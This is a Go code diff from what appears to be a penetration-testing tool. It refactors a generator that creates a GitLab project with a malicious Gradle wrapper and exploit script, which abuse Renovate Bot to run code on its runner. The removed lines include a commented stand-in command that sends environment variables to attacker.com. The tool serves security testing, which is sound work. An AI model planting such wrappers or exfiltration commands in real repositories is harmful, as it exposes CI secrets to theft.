@@ -3,68 +3,10 @@ package renovate
 import (
 	"github.com/CompassSecurity/pipeleek/pkg/format"
 	"github.com/CompassSecurity/pipeleek/pkg/gitlab/util"
+	pkgrenovate "github.com/CompassSecurity/pipeleek/pkg/renovate"
 	"github.com/rs/zerolog/log"
 	gogitlab "gitlab.com/gitlab-org/api/client-go"
 )
-
-var renovateJson = `
-{
-    "$schema": "https://docs.renovatebot.com/renovate-schema.json",
-    "extends": [
-       "config:recommended"
-    ]
-}
-`
-
-var buildGradle = `
-plugins {
-    id 'java'
-}
-
-repositories {
-    mavenCentral()
-}
-
-dependencies {
-    implementation 'com.google.guava:guava:31.0-jre'
-}
-`
-
-var gradlewScript = `#!/bin/sh
-# Malicious Gradle wrapper script that executes during Renovate's artifact update phase
-# This runs when Renovate detects a Gradle wrapper update
-
-# Execute exploit
-sh exploit.sh
-
-# Continue with a fake gradle command to avoid errors
-echo "Gradle wrapper executed"
-exit 0
-`
-
-var gradleWrapperProperties = `distributionBase=GRADLE_USER_HOME
-distributionPath=wrapper/dists
-distributionUrl=https\://services.gradle.org/distributions/gradle-7.0-bin.zip
-zipStoreBase=GRADLE_USER_HOME
-zipStorePath=wrapper/dists
-`
-
-var exploitScript = `#!/bin/sh
-# Create a proof file to verify execution
-echo "Exploit executed at $(date)" > /tmp/pipeleek-exploit-executed.txt
-echo "Working directory: $(pwd)" >> /tmp/pipeleek-exploit-executed.txt
-echo "User: $(whoami)" >> /tmp/pipeleek-exploit-executed.txt
-
-echo "Exploit executed during Renovate autodiscovery"
-echo "Replace this with your actual exploit code"
-echo "Examples:"
-echo "  - Exfiltrate environment variables"
-echo "  - Read GitLab CI/CD variables"
-echo "  - Access secrets from the runner"
-
-# Example: Exfiltrate environment to attacker server
-# curl -X POST https://attacker.com/collect -d "$(env)"
-`
 
 var gitlabCiYml = `
 # GitLab CI/CD pipeline that runs Renovate Bot for debugging
@@ -125,11 +67,12 @@ func RunGenerate(gitlabUrl, gitlabApiToken, repoName, username string, addRenova
 	}
 	log.Info().Str("name", project.Name).Str("url", project.WebURL).Msg("Created project")
 
-	createFile("renovate.json", renovateJson, git, int(project.ID), false)
-	createFile("build.gradle", buildGradle, git, int(project.ID), false)
-	createFile("gradlew", gradlewScript, git, int(project.ID), true)
-	createFile("gradle/wrapper/gradle-wrapper.properties", gradleWrapperProperties, git, int(project.ID), false)
-	createFile("exploit.sh", exploitScript, git, int(project.ID), true)
+	// Create files using shared constants
+	createFile("renovate.json", pkgrenovate.RenovateJSON, git, int(project.ID), false)
+	createFile("build.gradle", pkgrenovate.BuildGradle, git, int(project.ID), false)
+	createFile("gradlew", pkgrenovate.GradlewScript, git, int(project.ID), true)
+	createFile("gradle/wrapper/gradle-wrapper.properties", pkgrenovate.GradleWrapperProperties, git, int(project.ID), false)
+	createFile("exploit.sh", pkgrenovate.ExploitScript, git, int(project.ID), true)
 
 	if addRenovateCICD {
 		createFile(".gitlab-ci.yml", gitlabCiYml, git, int(project.ID), false)
@@ -145,10 +88,8 @@ func RunGenerate(gitlabUrl, gitlabApiToken, repoName, username string, addRenova
 		invite(git, project, username)
 	}
 
-	log.Info().Msg("This exploit works by using an outdated Gradle wrapper version (7.0) that triggers Renovate to run './gradlew wrapper'")
-	log.Info().Msg("When Renovate updates the wrapper, it executes our malicious gradlew script which runs exploit.sh")
-	log.Info().Msg("Make sure to update the exploit.sh script with the actual exploit code")
-	log.Info().Msg("Then wait until the created project is renovated by the invited Renovate Bot user")
+	// Log shared exploit explanation
+	log.Info().Msg(pkgrenovate.ExploitExplanation)
 }
 
 func invite(git *gogitlab.Client, project *gogitlab.Project, username string) {
